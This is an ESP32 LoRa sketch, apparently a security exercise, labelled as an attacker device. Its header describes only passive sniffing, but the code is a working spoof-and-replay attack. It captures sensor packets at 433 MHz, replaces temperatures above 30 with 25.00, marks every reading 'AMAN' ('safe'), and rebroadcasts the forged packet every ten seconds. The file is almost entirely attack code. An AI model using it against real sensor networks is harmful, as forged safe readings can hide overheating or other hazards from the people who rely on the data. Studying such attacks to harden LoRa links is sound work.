/*
ATTACKER / SNIFFER LoRa
--------------------------------
Author: Mohammad Rizki  Fadillah
Description:
This code implements a LoRa sniffer that listens for LoRa packets on a specified frequency and prints the received data along with signal strength (RSSI) and signal-to-noise ratio (SNR). It uses the LoRa library to interface with the LoRa module and the SPI library for communication. The sniffer is configured to use specific pins for SS, RST, and DIO0, and it sets the spreading factor, signal bandwidth, and coding rate to match the sender's configuration. The code continuously checks for incoming packets and prints their contents when detected.
This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain proper permissions before conducting any security testing.
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

String lastPacket = "";
unsigned long lastReplay = 0;
const unsigned long replayInterval = 10000; // 10 seconds

// =====================
// PARSE FLOAT DARI STRING
// =====================
float getTemp(String data) {
  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);
  int p3 = data.indexOf(',', p2 + 1);

  if (p1 == -1 || p2 == -1 || p3 == -1) return 0;

  String tempStr = data.substring(p2 + 1, p3);
  return tempStr.toFloat();
}

// =====================
// RULE TAMPERING
// =====================
String tamper(String data) {
  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) return data;

  String counter = data.substring(0, p1);
  String timestamp = data.substring(p1 + 1, p2);

  float temp = getTemp(data);

  String fakeTemp;
  String fakeStatus;

  // ===== RULE =====
  if (temp > 30) {
    fakeTemp = "25.00";
    fakeStatus = "AMAN";
  } else {
    fakeTemp = String(temp);
    fakeStatus = "AMAN";
  }

  return counter + "," + timestamp + "," + fakeTemp + "," + fakeStatus;
}

void setup() {
  Serial.begin(115200);

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433000000)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("Attacker Ready (Rule-Based Tampering)");
}

void loop() {
  // ===== SNIFF =====
  int packetSize = LoRa.parsePacket();

  if (packetSize) {
    String received = "";

    while (LoRa.available()) {
      received += (char)LoRa.read();
    }

    Serial.print("[SNIFF] ");
    Serial.println(received);

    lastPacket = received;
  }

  // ===== TAMPER + REPLAY =====
  if (lastPacket != "" && millis() - lastReplay > replayInterval) {
    lastReplay = millis();

    String fake = tamper(lastPacket);

    Serial.print("[TAMPER RULE] ");
    Serial.println(fake);

    LoRa.beginPacket();
    LoRa.print(fake);
    LoRa.endPacket();

    LoRa.receive();
  }
}